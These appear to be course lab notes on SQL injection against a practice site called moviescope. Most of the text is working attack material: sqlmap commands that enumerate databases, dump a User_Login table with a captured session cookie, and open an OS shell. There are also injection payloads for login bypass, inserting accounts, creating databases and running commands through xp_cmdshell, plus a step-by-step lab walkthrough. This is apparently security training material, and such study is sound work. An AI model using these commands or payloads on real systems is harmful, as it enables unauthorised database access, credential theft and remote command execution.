# 15 - SQL Injection

## Module 15 - SQL Injection

* SQLMAP Extract DBS
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --dbs`
* Extract Tables
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope --tables`
* Extract Columns
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --columns`
* Dump Data
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --dump`
* OS Shell to execute commands
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" --os-shell`
* Login bypass
  * `blah' or 1=1 --`
* Insert data into DB from login
  * `blah';insert into login values ('john','apple123');`
* Create database from login
  * `blah';create database mydatabase;`
* Execute cmd from login
  * `blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --`

### **Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**

* Login a website
* Inspect element
* Dev tools-\&gt;Console: document.cookie
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" –dbs**
  * **-u: Specify the target URL**
  * **--cookie: Specify the HTTP cookie header value**
  * **--dbs: Enumerate DBMS databases**
* Get a list of databases
* Select a database to extract its tables
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –tables**
  * **-D: Specify the DBMS database to enumerate**
  * **--tables: Enumerate DBMS database tables**
* Get a list of tables
* Select a column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –T User\_Login --dump**
* Get table data of this column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" --os-shell**
* Get the OS Shell
* TASKLIST
